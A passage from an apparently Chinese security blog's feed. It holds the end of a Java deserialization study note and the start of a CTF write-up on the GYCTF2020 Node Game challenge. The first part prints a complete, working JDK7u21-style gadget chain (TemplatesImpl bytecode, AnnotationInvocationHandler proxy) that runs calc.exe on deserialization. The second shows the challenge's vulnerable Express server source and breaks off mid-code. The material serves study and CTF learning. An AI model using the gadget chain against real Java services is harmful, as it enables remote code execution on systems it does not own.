    <span class="token keyword">public</span> <span class="token class-name">Evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello TemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>rce代码如下</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">LinkedHashSet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> rce <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> clazz <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Evil</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>clazz<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"HelloTemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">String</span> zeroHashCodeStr <span class="token operator">=</span> <span class="token string">"f5a5a608"</span><span class="token punctuation">;</span>

        <span class="token comment">// 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值</span>
        <span class="token class-name">HashMap</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>zeroHashCodeStr<span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 实例化AnnotationInvocationHandler类</span>
        <span class="token class-name">Constructor</span> handlerConstructor <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        handlerConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">InvocationHandler</span> tempHandler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> handlerConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> map<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 为tempHandler创造一层代理</span>
        <span class="token class-name">Templates</span> proxy <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>rce<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> tempHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 实例化HashSet，并将两个对象放进去</span>
        <span class="token class-name">HashSet</span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedHashSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>proxy<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 将恶意templates设置到map中</span>
        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>zeroHashCodeStr<span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> o <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>参考的太多了，除了文中列举的，总结个大概</p>
<ul>
<li>P🐮的知识星球的文章，CC链主要参考《Java安全漫谈》系列，Fastjson参考星球上《FastJson安全入门初探》</li>
<li>部分理解来自<code>H0t-A1r-B4llo0n</code>师傅博客：<a href="https://www.guildhab.top/">https://www.guildhab.top/</a></li>
<li>另外还有先知上的文章就不一一列举了</li>
</ul>
<p>感谢师傅们！</p>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>记几道JavaScript题</title>
    <url>/posts/bd369d31/</url>
    <content><![CDATA[<p>Tip：<code>npm audit</code>，Run a security audit</p>
<span id="more"></span>

<h3 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h3><p>题目链接：<a href="https://buuoj.cn/challenges#[GYCTF2020]Node%20Game">https://buuoj.cn/challenges#[GYCTF2020]Node%20Game</a></p>
<p>比赛的时候好像有个提示：Node 版本为 8.12.0</p>
<p>这题主要考的是<code>node代审</code>、<code>SSRF</code>和<code>请求夹带（http走私）</code></p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> pug <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> morgan <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'morgan'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> multer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'multer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">multer</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">dest</span><span class="token operator">:</span> <span class="token string">'./dist'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">morgan</span><span class="token punctuation">(</span><span class="token string">'short'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/uploads"</span><span class="token punctuation">,</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'/uploads'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/template"</span><span class="token punctuation">,</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'/template'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> action <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>action<span class="token operator">?</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>action<span class="token operator">:</span><span class="token string">"index"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> action<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">||</span> action<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Errrrr, You have been Blocked"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    file <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/template/'</span><span class="token operator">+</span> action <span class="token operator">+</span><span class="token string">'.pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> html <span class="token operator">=</span> pug<span class="token punctuation">.</span><span class="token function">renderFile</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/file_upload'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> ip <span class="token operator">=</span> req<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>remoteAddress<span class="token punctuation">;</span>
    <span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ip<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        obj<span class="token punctuation">.</span>msg<span class="token operator">=</span><span class="token string">"only admin's ip can use it"</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> 
    <span class="token punctuation">&#125;</span>
    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>path<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">'upload failed'</span><span class="token punctuation">;</span>
            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">var</span> file_path <span class="token operator">=</span> <span class="token string">'/uploads/'</span> <span class="token operator">+</span> req<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mimetype <span class="token operator">+</span><span class="token string">"/"</span><span class="token punctuation">;</span>
            <span class="token keyword">var</span> file_name <span class="token operator">=</span> req<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>originalname
            <span class="token keyword">var</span> dir_file <span class="token operator">=</span> __dirname <span class="token operator">+</span> file_path <span class="token operator">+</span> file_name
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> file_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                    fs<span class="token punctuation">.</span><span class="token function">mkdirSync</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> file_path<span class="token punctuation">)</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">"file type error"</span><span class="token punctuation">;</span>
                    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">return</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span>dir_file<span class="token punctuation">,</span>data<span class="token punctuation">)</span>
                obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
                    <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'upload success'</span><span class="token punctuation">,</span>
                    <span class="token literal-property property">filename</span><span class="token operator">:</span> file_path <span class="token operator">+</span> file_name
                <span class="token punctuation">&#125;</span> 
            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">'upload failed'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/template/source.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/core'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> q <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q<span class="token punctuation">;</span>
    <span class="token keyword">var</span> resp <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">'http://localhost:8081/source?'</span> <span class="token operator">+</span> q
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        <span class="token keyword">var</span> trigger <span class="token operator">=</span> <span class="token function">blacklist</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>trigger <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"&lt;p>error occurs!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                http<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resp</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    resp<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    resp<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">.</span>code <span class="token operator">===</span> <span class="token string">"ECONNRESET"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Timeout occurs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                     <span class="token keyword">return</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                    resp<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">chunk</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                         resps <span class="token operator">=</span> chunk<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                         res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>resps<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                           res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">&#125;</span>
 
